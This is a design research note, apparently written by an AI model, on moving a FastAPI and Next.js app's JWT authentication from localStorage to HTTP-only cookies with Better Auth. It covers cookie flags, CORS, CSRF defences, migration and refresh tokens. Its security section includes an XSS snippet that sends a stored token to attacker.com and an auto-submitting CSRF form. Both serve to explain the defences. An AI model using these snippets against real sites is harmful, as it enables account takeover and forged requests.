# Research: Better Auth Migration with HTTP-Only Cookies

**Feature ID:** 009-better-auth-migration
**Research Date:** 2026-02-09
**Researcher:** AI Assistant

---

## Executive Summary

This research document explores the technical approach for migrating from custom JWT + localStorage authentication to Better Auth with HTTP-only cookies. Key findings indicate that a **hybrid approach** is optimal: using Better Auth client-side for session management while maintaining a JWT-compatible FastAPI backend with cookie-based token storage.

---

## Research Questions

1. **How does Better Auth work with FastAPI backends?**
2. **What are the security implications of localStorage vs HTTP-only cookies?**
3. **How to implement cookie-based authentication in FastAPI?**
4. **What is the best migration strategy to avoid user disruption?**
5. **How to handle CSRF protection with cookie-based auth?**

---

## Findings

### 1. Better Auth Architecture

#### Better Auth Overview
- **Purpose:** Modern authentication library for React/Next.js applications
- **Version:** 1.4.18 (installed in project)
- **Key Features:**
  - Session management with HTTP-only cookies
  - Built-in CSRF protection
  - OAuth provider support (Google, GitHub, etc.)
  - TypeScript-first design
  - Framework agnostic (works with any backend)

#### Better Auth Backend Support
**Finding:** Better Auth does NOT have an official Python/FastAPI package.

**Options:**
1. **Use Better Auth client-only** with custom FastAPI backend (RECOMMENDED)
2. Build custom Better Auth-compatible FastAPI integration
3. Use Node.js backend with Better Auth (requires complete rewrite)

**Decision:** Option 1 - Better Auth client with JWT-compatible FastAPI backend

**Rationale:**
- Maintains existing FastAPI infrastructure
- Better Auth client handles cookie management
- FastAPI provides JWT tokens in cookies instead of response body
- No need to rewrite entire backend
- Leverages existing bcrypt password hashing

---

### 2. Security Analysis: localStorage vs HTTP-Only Cookies

#### localStorage Security Issues

**XSS Vulnerability:**
```javascript
// Attacker can steal tokens via XSS
const token = localStorage.getItem('auth-token');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: token
});
```

**Impact:** Complete account takeover if XSS vulnerability exists

#### HTTP-Only Cookies Security Benefits

**Protection Mechanism:**
```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
```

**Benefits:**
- `HttpOnly`: JavaScript cannot access cookie (prevents XSS token theft)
- `Secure`: Cookie only sent over HTTPS (prevents MITM)
- `SameSite=Lax`: Prevents CSRF attacks
- Automatic transmission with requests (no manual header management)

**Limitations:**
- Requires HTTPS in production
- CORS configuration more complex
- Cannot be read by JavaScript (need separate endpoint for user info)

#### Security Comparison

| Feature | localStorage | HTTP-Only Cookies |
|---------|-------------|-------------------|
| XSS Protection | ❌ Vulnerable | ✅ Protected |
| CSRF Protection | ✅ Not vulnerable | ⚠️ Needs SameSite |
| HTTPS Required | ❌ No | ✅ Yes (production) |
| JavaScript Access | ✅ Yes | ❌ No |
| Automatic Transmission | ❌ Manual | ✅ Automatic |
| CORS Complexity | Low | Medium |

**Conclusion:** HTTP-only cookies provide significantly better security against XSS attacks, which are more common than CSRF attacks in modern applications.

---

### 3. FastAPI Cookie-Based Authentication

#### Implementation Approach

**Current Flow (localStorage):**
```
1. POST /api/users/login → Returns {access_token: "jwt"}
2. Frontend stores in localStorage
3. Frontend adds Authorization: Bearer {token} header
4. Backend validates JWT from header
```

**New Flow (HTTP-only cookies):**
```
1. POST /api/users/login → Sets cookie, returns user info
2. Browser automatically stores cookie
3. Browser automatically sends cookie with requests
4. Backend validates JWT from cookie
```

#### FastAPI Cookie Implementation

**Setting Cookies:**
```python
from fastapi import Response
from fastapi.responses import JSONResponse

@app.post("/api/users/login")
async def login(response: Response, credentials: LoginRequest):
    # Validate credentials
    user = await authenticate_user(credentials)

    # Create JWT token
    token = create_access_token(user.id)

    # Set HTTP-only cookie
    response.set_cookie(
        key="session_token",
        value=token,
        httponly=True,
        secure=True,  # HTTPS only in production
        samesite="lax",
        max_age=604800,  # 7 days
        path="/"
    )

    return {"user": user.dict()}
```

**Reading Cookies:**
```python
from fastapi import Cookie, HTTPException

async def get_current_user(session_token: str = Cookie(None)):
    if not session_token:
        raise HTTPException(status_code=401, detail="Not authenticated")

    try:
        payload = decode_jwt_token(session_token)
        user_id = payload.get("sub")
        return await get_user_by_id(user_id)
    except JWTError:
        raise HTTPException(status_code=401, detail="Invalid token")
```

#### CORS Configuration for Cookies

**Critical Settings:**
```python
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:3000"],  # Frontend URL
    allow_credentials=True,  # REQUIRED for cookies
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**Frontend Fetch Configuration:**
```typescript
fetch('http://localhost:8000/api/endpoint', {
  credentials: 'include',  // REQUIRED to send cookies
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(data)
})
```

---

### 4. Migration Strategy

#### Option A: Big Bang Migration
**Approach:** Deploy all changes at once, force all users to re-login

**Pros:**
- Clean cutover
- No dual-system complexity
- Faster implementation

**Cons:**
- All users logged out simultaneously
- Higher risk of issues
- No rollback without downtime

#### Option B: Gradual Migration (RECOMMENDED)
**Approach:** Support both localStorage and cookies temporarily

**Implementation:**
```python
async def get_current_user(
    session_token: str = Cookie(None),
    authorization: str = Header(None)
):
    # Try cookie first (new system)
    if session_token:
        return await validate_cookie_token(session_token)

    # Fall back to Authorization header (old system)
    if authorization and authorization.startswith("Bearer "):
        token = authorization.split(" ")[1]
        return await validate_bearer_token(token)

    raise HTTPException(status_code=401)
```

**Migration Flow:**
1. Deploy backend with dual support (cookies + headers)
2. Deploy frontend with cookie-based auth
3. Existing sessions continue with localStorage
4. New logins use cookies
5. After 30 days, remove localStorage support

**Pros:**
- Zero downtime
- Users not forced to re-login
- Can rollback easily
- Lower risk

**Cons:**
- More complex implementation
- Temporary dual-system maintenance
- Longer migration timeline

**Decision:** Use Option B (Gradual Migration)

---

### 5. CSRF Protection

#### CSRF Attack Vector with Cookies

**Problem:** Cookies are automatically sent with requests, enabling CSRF attacks

**Attack Example:**
```html
<!-- Attacker's website -->
<form action="https://yourapp.com/api/tasks/delete" method="POST">
  <input type="hidden" name="task_id" value="123">
</form>
<script>document.forms[0].submit();</script>
```

If user is logged in, their cookie is sent automatically, and the request succeeds.

#### Protection Mechanisms

**1. SameSite Cookie Attribute (Primary Defense)**
```python
response.set_cookie(
    key="session_token",
    value=token,
    samesite="lax",  # Prevents CSRF for POST/PUT/DELETE
    # ...
)
```

**SameSite Options:**
- `Strict`: Cookie never sent cross-site (breaks OAuth flows)
- `Lax`: Cookie sent for top-level navigation (GET), not for POST/PUT/DELETE
- `None`: Cookie always sent (requires Secure flag)

**Recommendation:** Use `SameSite=Lax` for balance between security and usability

**2. CSRF Token (Secondary Defense)**
```python
# Generate CSRF token
csrf_token = secrets.token_urlsafe(32)
response.set_cookie(
    key="csrf_token",
    value=csrf_token,
    httponly=False,  # JavaScript needs to read this
    samesite="lax"
)

# Validate CSRF token on state-changing requests
@app.post("/api/tasks")
async def create_task(
    csrf_token: str = Header(None, alias="X-CSRF-Token"),
    csrf_cookie: str = Cookie(None, alias="csrf_token")
):
    if csrf_token != csrf_cookie:
        raise HTTPException(status_code=403, detail="CSRF validation failed")
```

**Decision:** Use `SameSite=Lax` as primary defense. CSRF tokens optional for extra security.

---

### 6. Token Refresh Strategy

#### Current System
- 30-minute token expiration
- No refresh mechanism
- Users must re-login frequently

#### Proposed System

**Option A: Long-Lived Tokens**
- Single token with 7-day expiration
- Simpler implementation
- Less secure (stolen token valid for 7 days)

**Option B: Access + Refresh Tokens (RECOMMENDED)**
- Short-lived access token (15 minutes)
- Long-lived refresh token (7 days)
- Automatic refresh before expiration

**Implementation:**
```python
# Login returns both tokens
@app.post("/api/users/login")
async def login(response: Response):
    access_token = create_access_token(user.id, expires_delta=timedelta(minutes=15))
    refresh_token = create_refresh_token(user.id, expires_delta=timedelta(days=7))

    response.set_cookie(key="access_token", value=access_token, max_age=900)
    response.set_cookie(key="refresh_token", value=refresh_token, max_age=604800)

    return {"user": user.dict()}

# Refresh endpoint
@app.post("/api/auth/refresh")
async def refresh(refresh_token: str = Cookie(None)):
    payload = decode_refresh_token(refresh_token)
    new_access_token = create_access_token(payload["sub"])

    response.set_cookie(key="access_token", value=new_access_token, max_age=900)
    return {"refreshed": True}
```

**Frontend Auto-Refresh:**
```typescript
// Refresh token 1 minute before expiration
setInterval(async () => {
  await fetch('/api/auth/refresh', {
    method: 'POST',
    credentials: 'include'
  });
}, 14 * 60 * 1000); // Every 14 minutes
```

**Decision:** Implement access + refresh tokens for better security and UX

---

## Technical Decisions

### Decision 1: Hybrid Architecture
**Choice:** Better Auth client + Custom FastAPI backend with cookies
**Rationale:** Leverages Better Auth's client features without requiring Python rewrite
**Trade-offs:** Not using Better Auth's full backend capabilities

### Decision 2: Gradual Migration
**Choice:** Support both localStorage and cookies during transition
**Rationale:** Zero downtime, no forced re-login, lower risk
**Trade-offs:** Temporary code complexity

### Decision 3: JWT in Cookies
**Choice:** Continue using JWT format, but store in cookies
**Rationale:** Maintains API compatibility, leverages existing infrastructure
**Trade-offs:** Not using Better Auth's native session format

### Decision 4: SameSite=Lax
**Choice:** Use SameSite=Lax for CSRF protection
**Rationale:** Balances security and usability, works with OAuth flows
**Trade-offs:** Not as strict as SameSite=Strict

### Decision 5: Access + Refresh Tokens
**Choice:** Implement dual-token system
**Rationale:** Better security (short-lived access tokens) + better UX (no frequent re-login)
**Trade-offs:** More complex implementation

---

## Implementation Recommendations

### Phase 1: Backend Cookie Support
1. Add cookie-based authentication alongside existing Bearer token auth
2. Implement dual authentication in `get_current_user` dependency
3. Update login/register endpoints to set cookies
4. Configure CORS for credentials

### Phase 2: Frontend Migration
1. Configure Better Auth client with cookie support
2. Update auth-provider to use cookies
3. Remove localStorage token storage
4. Update API client to use `credentials: 'include'`

### Phase 3: Token Refresh
1. Implement refresh token generation
2. Add `/api/auth/refresh` endpoint
3. Implement frontend auto-refresh logic
4. Handle refresh failures gracefully

### Phase 4: Cleanup
1. Monitor localStorage usage (should be zero)
2. After 30 days, remove Bearer token support
3. Remove dual-authentication code
4. Update documentation

---

## Security Checklist

- [x] HTTP-only cookies prevent XSS token theft
- [x] Secure flag for HTTPS-only transmission
- [x] SameSite=Lax prevents CSRF attacks
- [x] Short-lived access tokens (15 minutes)
- [x] Long-lived refresh tokens (7 days)
- [x] CORS configured with allow_credentials=True
- [x] Bcrypt password hashing maintained
- [ ] Rate limiting on login endpoint (future)
- [ ] Account lockout after failed attempts (future)
- [ ] Audit logging for authentication events (future)

---

## References

1. **Better Auth Documentation:** https://better-auth.com/docs
2. **FastAPI Cookies:** https://fastapi.tiangolo.com/advanced/response-cookies/
3. **OWASP Session Management:** https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
4. **MDN HTTP Cookies:** https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
5. **SameSite Cookies Explained:** https://web.dev/samesite-cookies-explained/
6. **JWT Best Practices:** https://tools.ietf.org/html/rfc8725

---

## Conclusion

The hybrid approach (Better Auth client + FastAPI JWT backend with cookies) provides the best balance of security, maintainability, and migration safety. The gradual migration strategy ensures zero downtime and no user disruption while achieving the security goals of eliminating XSS vulnerabilities through HTTP-only cookies.
